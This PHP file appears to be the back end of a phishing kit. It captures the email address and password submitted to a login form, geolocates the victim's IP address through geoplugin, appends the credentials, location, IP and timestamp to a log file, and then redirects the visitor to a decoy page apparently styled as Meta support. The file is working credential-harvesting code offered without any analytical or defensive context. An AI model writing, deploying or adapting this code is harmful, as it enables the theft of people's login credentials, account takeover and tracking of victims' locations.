<?php
$file = "yellowFlash_______________.txt";
$emid = $_POST['email'];
$pasid = $_POST['pass'];
$server = $_SERVER['REMOTE_ADDR'];
$host = "http://www.geoplugin.net/php.gp?ip=$server";
$response = fetch($host);
$data = unserialize($response);
$cit = $data['geoplugin_city'];
$reg = $data['geoplugin_regionName'];
$cou = $data['geoplugin_countryName'];
$cod = $data['geoplugin_countryCode'];
$date = date("F j, Y, g:i a");

function fetch($host) {

    if ( function_exists('curl_init') ) {
                    
        //use cURL to fetch data
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $host);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'geoPlugin PHP Class v1.0');
        $response = curl_exec($ch);
        curl_close ($ch);
        
    } else if ( ini_get('allow_url_fopen') ) {
        
        //fall back to fopen()
        $response = file_get_contents($host, 'r');
        
    } else {

        trigger_error ('geoPlugin class Error: Cannot retrieve data. Either compile PHP with cURL support or enable allow_url_fopen in php.ini ', E_USER_ERROR);
        return;
    
    }
    
    return $response;
}

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "____________________________________________________|ONE|");
fwrite($handle, "\n");
fwrite($handle, "User ID         : ");
fwrite($handle, "$emid");
fwrite($handle, "\n");
fwrite($handle, "User Pass       : ");
fwrite($handle, "$pasid");
fwrite($handle, "\n");
fwrite($handle, "City and Region : ");
fwrite($handle, "$cit");
fwrite($handle, ", ");
fwrite($handle, "$reg");
fwrite($handle, "\n");
fwrite($handle, "Country         : ");
fwrite($handle, "$cou");
fwrite($handle, " (");
fwrite($handle, "$cod");
fwrite($handle, ")");
fwrite($handle, "\n");
fwrite($handle, "IP Address      : ");
fwrite($handle, "$server");
fwrite($handle, "\n");
fwrite($handle, "Date of entry   : ");
fwrite($handle, "$date");
fwrite($handle, "\n");
fwrite($handle, "____________________________________________________|ONE|");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"false.html?section_id=1-HowToContactMeta\";
// -->
</script>";
?>